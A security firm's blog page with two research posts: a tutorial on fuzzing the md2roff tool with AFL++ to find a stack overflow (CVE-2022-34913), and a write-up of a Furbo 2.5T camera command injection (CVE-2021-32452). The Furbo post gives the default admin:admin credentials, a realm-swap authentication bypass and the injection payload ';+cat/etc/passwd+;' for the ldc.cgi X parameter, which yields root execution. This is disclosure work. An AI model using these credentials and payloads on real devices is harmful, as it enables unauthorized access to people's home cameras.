AFL++ is the successor to AFL, which was originally developed by Michał Zalewski at Google. This quick overview is quite an oversimplification of the tool’s full capabilities.  The important bits of information required to fuzz programs with AFL++ are:

1. **Compilation** **using instrumentation.**
2. **Creating inputs.**
3. **Fuzzing the program and triaging crashes.**

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/40105a0b-5b25-4a4b-bcea-cc73de8eea71/aflpp_bg-768x769_1_50.png)

If you are running Kali Linux, AFL++ can be installed using the APT package manager.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/75f3e228-df45-4334-b8a9-90567e319556/afl_plus_plus_install_kali.png)

Once AFL++ is installed, the process of fuzzing a binary can be fairly simple. We only need to complete a few steps to get AFL++ started.

## **Discovering CVE-2022-34913 With AFL++**

First, we can download the md2roff tool (version 1.7) from GitHub onto our local machine and browse to the folder containing the source code and Makefile. The md2roff tool is written in C and can be compiled to produce an executable. AFL++ includes a special [clang](https://clang.llvm.org/) compiler used for instrumentation. Instrumentation is the process of adding code, variables, and symbols to the program to help AFL++ better identify the program flow and produce a crash. AFL++ instrumentation is not limited to compilation alone, and can be used in [binary-only](https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/README.md) mode to instrument binaries. Typically the $(CC) variable is used in Makefiles to specify which compiler to use. Let’s point the ‘CC’ environmental variable to the location of our ‘afl-clang-fast’ compiler. Once we have verified this variable is set, we can run the ‘make’ command to compile the source code.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/55b30fdf-5b56-419d-be44-db316519bf02/md2roff_compile_AFL.png)

**Creating Input and Output Directories**

AFL++ requires two folders before it can get started. The first folder will contain our sample input (test cases), and the second will be an output directory where AFL++ will write the fuzzing results.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/81883052-c70d-4dc0-801d-f89104340890/mkdir_input_output.png)

Our input folder needs to contain a test case that will be utilized and modified by AFL++. If we want to fuzz md2roff’s markdown processing functionality, our input directory must have a sample markdown file with primitive contents. This file serves as a ‘base case’ of what program input should resemble.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/cc4d2f88-db9c-4bbb-b061-968f216adb0e/afl_sample_input-1.png)

Once we have verified our sample input we can start AFL++ by using the ‘afl-fuzz’ command:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/5cca5449-3c53-4f19-a434-50ffc9e19ac8/start_afl.png)

**afl-fuzz**– The AFL++ command used to fuzz a binary.

* **-i input**– The input directory containing our base case.
* **-o output**– The output directory that AFL++ will write our results to.
* **./md2roff-** The name of the program we want to start with any applicable flags.
* **@@**– This syntax tells AFL++ that the input is coming from a file instead of stdin.

## **AFL++ Fuzzing**

Once AFL++ has initialized, it will continue fuzzing the program with mutated input until you decide to stop it.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/ffcd0a71-261d-4504-b2fc-261ca9e7a45c/afl-fuzz.png)

The important sections from the interface are ‘saved crashes’ and ‘exec speed’. ‘Exec Speed’ will show us how fast AFL++ is able to generate new input and fuzz the program. ‘Saved Crashes’ shows us the number of unique crashes the fuzzer was able produce.

It looks like AFL++ discovered a few crashes! Let’s investigate the input that was used to produce the crash. The output/default/crashes directory will contain a file for each unique crash that was generated.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/cfa4dfd8-cd1c-4575-accb-a5d881bd552f/Screen-Shot-2022-06-30-at-5.55.04-PM.png)

There are plenty of crashes in the output folder to triage. Let’s take a look inside one of them:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/e0aac333-fe40-426c-b68c-fc5a57d7ad4b/Screen-Shot-2022-06-30-at-5.55.43-PM.png)

It seems like one of the files that produced a crash was a massive buffer of 1’s.

## **Reproducing the Crash**

We can generate a markdown document with identical input to the crash file seen in the ‘output/default/crashes directory’ using python3:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/6aae300e-ee31-4f2e-8588-af3be1ae46ec/vuln_md_file.png)

To confirm the crash, execute the md2roff program with the markdown file as the input:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/8f3f7359-1377-4bad-ba71-0806d7024ace/segfault.png)

It looks like the program segfaults when trying to process our large buffer of 1’s. At a minimum, we have a denial of service condition. We can attach GDB to our program and run md2roff a second time to see if we have altered the control flow and overwritten the return address.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/186a1445-2bd7-4316-9686-617204e344f8/gdb_registers.png)

Success! The stack was successfully smashed by our buffer of 1’s. From this point forward we could put together an exploit using a binary exploitation technique such as ret2libc or ROP chaining.  This would allow an attacker to compromise a victims computer if a malicious file was opened with the md2roff tool.

There are many other fuzzers such as [honggfuzz](https://github.com/google/honggfuzz), [Boofuzz](https://github.com/jtpereyda/boofuzz), [Libfuzzer](https://llvm.org/docs/LibFuzzer.html), [Syzkaller](https://github.com/google/syzkaller), and [go-fuzz](https://github.com/dvyukov/go-fuzz) that can assist developers and researchers in tailoring their fuzzing process to the type of software being tested. Implementing fuzz testing early in the development cycle can greatly reduce an organization's exposure to zero-day vulnerabilities and prevent cybercriminals from taking advantage of unintended software flaws.

**Citations**

“Zero-day (computing).” *Wikipedia*, https://en.wikipedia.org/wiki/Zero-day\_(computing).

Posted on October 17, 2022 by [Guest User](/blog?author=66bfea33c726ca54714cfe43) and tagged [CVE-2022-41220](/blog?tag=CVE-2022-41220) [CVE-2022-34556](/blog?tag=CVE-2022-34556) [CVE-2022-34913](/blog?tag=CVE-2022-34913) [CVE-2022-36752](/blog?tag=CVE-2022-36752) [Fuzzing](/blog?tag=Fuzzing) [AFL](/blog?tag=AFL) [Zero-Day](/blog?tag=Zero-Day).

# [Hacking the Furbo Dog Camera: Part II](/blog/2021/hacking-the-furbo-dog-camera-part-ii)

As mentioned in our [previous post](https://www.somersetrecon.com/blog/2021/hacking-the-furbo-part-1), Part II is a continuation of our research sparked by changes found in the revised Furbo 2.5T devices. This post specifically covers a command injection vulnerability (CVE-2021-32452) discovered in the HTTP server running on the Furbo 2.5T devices. If you happened to watch our [talk at the LayerOne conference](https://www.youtube.com/watch?v=W-Ur3c0c3OE), you may have already seen this in action!

## Background

After purchasing an additional Furbo to test a finalized version of our RTSP exploit on a new, unmodified Furbo, we found that our RTSP exploit wasn’t working. The RTSP service still appeared to be crashing, however it was not restarting so our strategy of brute-forcing the libc base address was no longer valid. After running an nmap scan targeting the new device we quickly realized something was different.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630603797341-BCJ6DTIEK9V6VX1ITPAU/nmap_results.png)

This Furbo had telnet and a web server listening. Physical inspection of the device revealed that the model number was 2.5T vs 2.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630604753579-55EGI5H38KKBOEZ0NQYP/stickers_combo.png)

We disassembled the new Furbo and while there were some slight hardware differences, we were still able to get a root shell via UART in the same manner as the Furbo 2.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1631562650227-1TWS54OU0H2AW8S2AXTY/furbo.jpg)

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630605616198-N3E8RBGGBFR2FRQ1YZXN/teardown_assembled.jpg)

We decided to take a look at the web server first to see what functionality it included.

## Web Server Reverse Engineering

Browsing to the IP of the Furbo presented us with an Authentication Required window. Observing the request indicated that the server was utilizing Digest Authentication, which was confirmed by looking at the server configuration.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630606730450-2E7SPSKPWRVF9AL1CYGW/2.5t_auth_dialog.png)

The following is a snippet from **/etc/lighttpd/lighttpd.conf:**

```
...
auth.debug = 0
auth.backend = "htdigest"
auth.backend.htdigest.userfile = "/etc/lighttpd/webpass.txt"

auth.require = ( "/" =>
  (
  "method" => "digest",
  "realm" => "ambarella",
  "require" => "valid-user"
  )
)
...

```

And the contents of **/etc/lighttpd/webpass.txt:**

```
admin:ycam.com:913fd17138fb6298ccf77d3853ddcf9f
```

We were able to quickly determine that the hashed value above is **admin** by utilizing the formula HASH = MD5(username:realm:password).

```
$ echo -ne "admin:ycam.com:admin" | md5
913fd17138fb6298ccf77d3853ddcf9f

```

However, when entering the credentials **admin:admin** we were still met with an Access Denied response. If you have a keen eye you may have noticed that the **realm** specified in the lighttpd.conf file is different from that specified in the webpass.txt file. This mismatch was preventing the authentication from succeeding. After some additional testing, we found that we could intercept the server response and modify the realm the Furbo was sending to the browser to create the Digest Authentication header. Intercepting the response and setting the realm to **ycam.com** allowed us to successfully authenticate to the web server.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630607109503-CQR0ID27WCJAQ8DLNGU0/modify_realm.png)

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630607180892-XFTB40FCBJ1IUXQ005FT/Screen+Shot+2021-05-05+at+2.06.19+PM.png)

Note the browser prompt displays **ycam.com** after we modified the response in Burp Suite. After entering the username and password we had access to the web server.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630607213642-PMYLEBTTON7L103TFPKF/ambarella_http_ldc.png)

Once we were able to interact with the web application, observing some requests in burp immediately revealed some interesting responses. The web application was utilizing a CGI executable, **ldc.cgi**, which appeared to be taking multiple parameters and inserting them into a command, **/usr/local/bin/test\_ldc**, which then gets executed on the Furbo.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630609014794-JDBUFRPQ0D13IBW2SUNM/normal_req.png)

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630609039567-9HWISOFGR9ZD95IEXI6S/normal_resp.png)

This looked like a good candidate for command injection and after a few more tests, we found our suspicions were correct! We attempted to inject **cat /etc/passwd** into various parameters.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630609071853-KPUEVUA1G56LXXXKRRBV/cmd_inj_req.png)

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630609090089-6ETHYES4UKQNUU23C21H/cmd_inj_response.png)

As seen above, a payload of **;+cat/etc/passwd+;** in the **X** parameter was injected into the **/usr/local/bin/test\_ldc** command and the results were included in the response! The web server was also running as **root**, so we had code execution as root on the new Furbo. The **mode**, **X**, **Y**, **zoom\_num**, **zoom\_denum**, **pano\_h\_fov** parameters were all vulnerable. This exploit is much more reliable than the RTSP buffer overflow as it does not involve memory corruption and the web server does not crash.

After confirming via dynamic testing, we grabbed the **ldc.cgi** executable off of the Furbo and popped it into Ghidra to see exactly what was happening under the hood.

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1630611049767-6KS6UYWDKPTSHN3Y5PH0/cmd_inj_ghidra.png)

The above snippet shows the various parameters we observed being retrieved and stored in variables, which then are used to build the **cmd** variable via the first **snprintf()** call. No sanitization is performed on any of the values received from the HTTP request. The **cmd** variable is then passed directly to a **system()** call seen at the bottom of the screen shot.

We created a python script that calculates the Authorization Digest header using the proper realm to automate the command injection and retrieval of results:

We also turned the exploit into a metasploit module:

Both scripts can be found on our [GitHub page](https://github.com/Somerset-Recon/furbo-research)!

## Disclosure

## Conclusion

The command injection vulnerability allows for consistent, reliable exploitation as it does not involve memory corruption like the RTSP buffer overflow which proved more difficult to exploit. We suspect that the command injection vulnerability may also be present in other devices that utilize Ambarella chipsets with the lighttpd server enabled. We would love to hear from you if you successfully test this on your devices!

Lastly, we've recently got our hands on the newly released Furbo Mini Cam, which saw some hardware changes including a new SoC. Stay tuned for our next post!

Posted on October 12, 2021 by [Jared French](/blog?author=6077763e2794bb679d0a5ee9).

[Blog](/blog)
Newer / [Older](/blog?offset=1634057350150)

## [Follow us on Twitter!](https://twitter.com/somersetrecon)

---

## Mailing List

Keep up to date on our newest work.  We send out a summary no more frequently than once a month.  And we'd never use your info for anything sinister.  We promise.

Thank you!

---

Want to say hi? Click on the button below to contact us with any questions you may have.

[Contact Somerset Recon](http://www.somersetrecon.com/contact/)

### Learn

[Home](/home)

[Industries](/industries)

[Services](/services)

[About](/about)

[Careers](/careers)

### Connect

[Twitter](https://twitter.com/SomersetRecon)

[Contact](/contact)

### Sign up for the latest news

Thank you!

---

© Somerset Recon, Inc


